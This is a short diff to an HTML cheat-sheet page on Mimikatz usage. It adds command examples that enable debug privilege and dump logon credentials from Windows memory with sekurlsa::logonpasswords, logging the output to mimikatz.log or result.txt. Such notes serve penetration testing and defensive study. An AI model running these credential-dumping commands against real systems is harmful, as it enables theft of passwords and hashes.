@@ -9,4 +9,7 @@ Mimikatz can be used to pass commands from the command line to Mimikatz for proc
 <br/>
 Command examples<br/>
 .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit<br/>
-.\mimikatz &#09;&#09;&#09;&#09;#enter CLI</body></html>
+.\mimikatz &#09;&#09;&#09;&#09;#enter CLI<br/>
+Mimikatz.exe "log sekurlsa::logonpassword" exit<ul><li style="list-style-type: none">And you will get a"mimikatz.log".</li>
+</ul>
+c:\temp&gt;mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit &gt;&gt; result.txt</body></html>
